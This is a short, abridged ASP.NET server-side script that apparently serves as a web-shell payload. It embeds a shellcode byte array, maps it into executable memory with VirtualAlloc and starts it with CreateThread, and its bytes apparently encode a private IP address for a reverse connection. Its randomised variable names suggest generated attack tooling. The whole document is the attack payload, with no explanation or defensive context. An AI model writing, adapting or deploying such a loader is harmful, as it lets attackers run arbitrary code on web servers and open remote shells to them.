...
<script runat="server">
    ...
    {
        byte[] sPKn_Zf = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,
...
0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x6d,
...
0xd5};
        ...
        IntPtr thfJnzCKHspT = VirtualAlloc(IntPtr.Zero,(UIntPtr)sPKn_Zf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(sPKn_Zf,0,thfJnzCKHspT,sPKn_Zf.Length);
        IntPtr yIR = IntPtr.Zero;
        IntPtr ydU_P = CreateThread(IntPtr.Zero,UIntPtr.Zero,thfJnzCKHspT,IntPtr.Zero,0,ref yIR);
    }
</script>
